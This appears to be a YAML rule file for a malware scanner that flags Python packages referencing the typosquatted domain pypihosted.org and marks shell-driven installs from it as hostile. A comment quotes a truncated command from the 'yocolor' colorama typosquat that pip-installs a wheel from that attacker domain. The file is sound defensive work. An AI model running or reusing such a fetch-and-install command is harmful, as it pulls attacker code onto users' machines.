defaults:
  platforms:
    - unix
    - windows
  crit: suspicious
  for:
    - python
    - pyproject.toml
traits:
  - id: pypihosted-domain
    desc: 'the typosquatted domain files.pypihosted.org'
    conf: 1.0
    if:
      type: text
      regex: (?i)[a-z0-9.-]*pypihosted\.org

# pypihosted.org is not PyPI. A package whose code installs FROM a URL on it
# (pip install https://pypihosted.org/...) is fetching a second stage from
# attacker infrastructure while wearing the registry's clothes.
#
# Worked example: the `yocolor` typosquat of colorama, whose __init__ runs
# `{sys.executable} -m pip install https://files.pypihosted.org/...whl`.
composite_rules:
  - id: pypihosted-url-stage-install
    desc: Package installs a stage from pypihosted URL
    crit: hostile
    conf: 0.97
    attack: T1195.002,T1105
    all:
      - id: pypihosted-domain
      - id: micro-behaviors/process/create/shell/spawn::shell-execution-capability
